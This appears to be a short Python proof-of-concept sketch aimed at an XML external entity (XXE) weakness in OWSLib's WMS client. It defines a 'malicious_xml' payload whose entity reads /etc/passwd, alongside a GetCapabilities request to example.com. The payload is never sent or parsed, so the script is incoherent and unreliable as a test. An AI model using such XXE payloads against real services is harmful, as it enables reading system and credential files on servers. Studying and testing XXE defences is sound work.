import requests
from owslib.wms import WebMapService

def fetch_wms_capabilities(url):
    wms = WebMapService(url)
    return wms.getcapabilities()

malicious_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
  <data>&xxe;</data>
</request>
"""

try:
    response = fetch_wms_capabilities('http://example.com/wms?service=WMS&request=GetCapabilities')
    print(response)
except Exception as e:
    print("An error occurred:", e)